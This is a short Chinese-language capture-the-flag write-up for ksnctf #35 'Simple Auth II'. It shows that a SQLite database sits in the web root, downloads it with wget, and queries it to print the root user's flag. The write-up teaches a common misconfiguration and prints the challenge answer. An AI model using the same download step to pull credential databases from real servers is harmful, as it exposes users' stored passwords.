---
title: 'ksnctf #35 Simple Auth II'
metaAlignment: center
coverMeta: out
thumbnailImagePosition: left
date: 2017-03-23 12:53:39
categories:
	- Writeups
	- ksnctf
thumbnailImage: ksnctf.png
keywords:
    - ksnctf
    - Simple Auth II
tags:
    - Writeups
---
初學SQL必犯的安全錯誤 {% raw %}Σ(*ﾟдﾟﾉ)ﾉ{% endraw %}
<!-- more -->

看一下原始碼馬上可以看到使用SQLite來儲存資料，而且是直接放在網頁目錄下。

{% codeblock lang:php %}
$db = new PDO('sqlite:database.db');
{% endcodeblock %}

所以可以直接下載database.db在本機的sqlite執行搜尋。

{% codeblock %}
$ wget http://ctfq.sweetduet.info:10080/~q35/database.db
$ sqlite3 database.db

sqlite> SELECT * FROM user;
root|FLAG_iySDmApNegJvwmxN
{% endcodeblock %}
